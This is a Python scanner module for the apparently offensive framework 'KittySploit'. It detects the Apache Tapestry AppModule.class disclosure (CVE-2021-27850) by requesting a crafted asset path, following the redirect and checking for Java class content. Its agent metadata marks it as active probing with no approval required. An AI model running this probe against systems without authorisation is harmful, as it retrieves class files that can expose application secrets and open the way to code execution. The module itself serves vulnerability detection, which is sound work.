#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Tapestry AppModule.class asset disclosure (CVE-2021-27850)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Tapestry - AppModule.class Disclosure Detection (CVE-2021-27850)',
        'description': (
            'Detects CVE-2021-27850 by requesting '
            '/assets/app/something/services/AppModule.class/, following the redirect, and '
            'checking for application/java content containing InnerClasses.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2021', 'apache', 'tapestry', 'rce',
            'info-disclosure', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.openwall.com/lists/oss-security/2021/04/15/1',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-27850',
        ],
        'cve': 'CVE-2021-27850',
    }

    def run(self):
        path = '/assets/app/something/services/AppModule.class/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code not in (301, 302, 303, 307, 308):
            return False
        loc = r.headers.get('Location') or r.headers.get('location') or ''
        if not loc:
            return False
        # Location may be absolute; http_request expects a path.
        if '://' in loc:
            from urllib.parse import urlparse
            loc = urlparse(loc).path or loc
        if not loc.endswith('/'):
            loc = loc + '/'
        r2 = self.http_request(method='GET', path=loc, allow_redirects=False)
        if not r2 or r2.status_code != 200:
            return False
        ctype = (r2.headers.get('Content-Type') or r2.headers.get('content-type') or '').lower()
        body = r2.content or b''
        if 'application/java' in ctype and b'InnerClasses' in body:
            self.set_info(
                severity='critical',
                reason='Apache Tapestry AppModule.class disclosure (CVE-2021-27850)',
                path=loc,
            )
            return True
        return False
